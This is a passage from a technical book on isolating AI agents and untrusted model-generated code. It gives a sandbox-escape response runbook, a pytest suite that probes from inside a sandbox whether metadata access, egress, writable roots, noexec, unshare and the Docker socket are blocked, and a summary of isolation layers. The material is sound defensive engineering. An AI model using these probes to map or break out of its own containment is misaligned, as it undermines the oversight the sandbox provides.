**Sandbox escape response** is the runbook for when containment fails — you must assume it eventually will, because CVE-class kernel and VMM bugs are discovered continually. A concrete runbook: (1) *Detect* — escape indicators are anomalous host-level syscalls from a sandbox, unexpected egress from the host network namespace, seccomp `KILL` events, or a sandbox process touching host paths; wire these to alerting. (2) *Contain* — immediately cordon the affected host from the scheduler so no new tenants land on it, and kill all sandboxes on it. (3) *Rotate* — treat every credential reachable from that host as compromised and rotate it (this is why sandboxes should hold *no* long-lived secrets, Ch. 16.2.1). (4) *Preserve* — snapshot the host for forensics before reimaging. (5) *Reimage* — never return an escaped-on host to the pool; rebuild it from a known-good image. (6) *Learn* — determine the escape primitive and tighten the profile (add the abused syscall to the seccomp KILL list, patch the kernel/VMM). Rehearse this runbook; an escape discovered in production is not the time to invent the response.

---

### 16.4.3 Verifying Isolation: Escape Testing and Continuous Boundary Assurance

Isolation controls decay silently: a base image update re-adds a capability, a "temporary" debug mount ships to prod, a seccomp profile drifts from the workload it was written for and gets loosened to stop breaking. An isolation boundary you do not continuously test is a boundary you merely hope exists. The remedy is **continuous escape testing** — an automated adversary that repeatedly tries to break out of the sandbox and fails a build (or pages an operator) the moment any attempt succeeds.

The escape test suite should assert, from *inside* a freshly provisioned sandbox, that every intended boundary holds: the metadata endpoint is unreachable, arbitrary egress is denied, the root filesystem is read-only, `/tmp` is `noexec`, blocked syscalls (`ptrace`, `unshare`, `mount`, `bpf`) return errno or kill the process, the Docker socket is absent, privilege escalation via setuid fails, and PID/memory/CPU limits terminate a deliberate resource bomb. These are the same probes a real attacker runs; running them yourself, on every image build and continuously in production, turns a silent regression into a loud test failure.

```python
# Continuous escape-assertion probe run from INSIDE a provisioned sandbox.
# Any success here is a containment failure -> fail the build / page on-call.
import os, socket, subprocess, pytest

def test_metadata_endpoint_blocked():
    s = socket.socket(); s.settimeout(2)
    with pytest.raises((socket.timeout, OSError)):
        s.connect(("169.254.169.254", 80))          # IMDS must be unreachable

def test_arbitrary_egress_blocked():
    s = socket.socket(); s.settimeout(2)
    with pytest.raises((socket.timeout, OSError)):
        s.connect(("93.184.216.34", 80))            # non-allowlisted host

def test_root_filesystem_readonly():
    with pytest.raises(OSError):
        open("/usr/bin/_escape_probe", "w").close() # root must be RO

def test_tmp_is_noexec():
    p = "/work/_probe.sh"
    with open(p, "w") as f: f.write("#!/bin/sh\necho pwned\n")
    os.chmod(p, 0o755)
    rc = subprocess.run([p], capture_output=True).returncode
    assert rc != 0                                   # noexec must block execution

def test_dangerous_syscalls_blocked():
    # unshare(CLONE_NEWUSER) should be denied by seccomp
    rc = subprocess.run(["unshare", "-U", "true"], capture_output=True).returncode
    assert rc != 0

def test_docker_socket_absent():
    assert not os.path.exists("/var/run/docker.sock")
```

Beyond assertion probes, invest in *adversarial* verification: run kernel-exploit proof-of-concepts and container-breakout tools (the kind red teams and CTF players use) against your actual production sandbox configuration in a staging harness, and subscribe to CVE feeds for your kernel, container runtime, and VMM so a newly disclosed escape primitive triggers a targeted re-test. Pair this with the escape-response runbook (Ch. 16.4.2): detection telemetry in production is itself a continuous test — a seccomp `KILL` event or an anomalous host syscall is the boundary reporting that something tried to cross it. The goal is not a one-time isolation audit but a standing assurance that the boundary you designed is the boundary you still have.

---

## Technical Chapter Summary

- Evaluate isolation runtimes by the **host syscall surface the guest can reach**, not by the container-vs-VM label: plain containers hit the full host kernel, gVisor interposes a user-space kernel, and MicroVMs (Firecracker, Kata) reduce the host surface to the VMM + KVM ioctl boundary — pick per risk, reserving MicroVMs/gVisor for untrusted model-generated code.
- **WebAssembly/WASI** offers capability-based, zero-ambient-authority sandboxing with microsecond starts and fuel metering, but its lack of native libraries makes it unsuitable for the NumPy/pandas/PyTorch workloads analytics agents want — use a tiered interpreter that routes library-heavy code to gVisor/Firecracker.
- **Ephemeral, disposable sandbox pools** with pre-warming give near-zero checkout latency while guaranteeing zero-state persistence: every sandbox runs exactly one workload and is destroyed, never recycled, so compromises die in seconds with nothing worth stealing.
- Network and filesystem isolation are **default-deny**: air-gapped interpreters mediated by an allow-list egress broker, explicit blocking of the `169.254.169.254` metadata endpoint and DNS exfiltration, read-only roots with `noexec,nosuid,nodev` transient scratch, and never mounting the host Docker socket.
- Compose **seccomp-BPF (shrink the syscall table), Landlock/AppArmor (constrain filesystem/network objects), and capability-drop (remove privileged ops)** — no single layer stops both a `bpf` kernel exploit and a path traversal, but together they force injected code into a near-inert cell.
- Browser-using agents get **one disposable headless browser per session** with a fresh profile, per-session egress allow-lists, CSP and request interception to block image/cross-origin DOM exfiltration, and un-bypassable **human-in-the-loop** interception on authentication and payment actions.
- Multi-tenant isolation must hold across **every plane — memory, cache, sandbox, vector index, logs** — with an attested `tenant_id` as a mandatory partition key; the cache plane is the subtle cross-tenant channel and every key must be tenant-salted.
- Engineer explicitly for **noisy neighbors (hard cgroup/PID/timeout ceilings, per-tenant quotas), sandbox escape (a detect-contain-rotate-reimage runbook), and continuous escape testing** — an untested boundary is only a hoped-for boundary, and isolation bounds the blast radius of an injection it can never itself prevent.
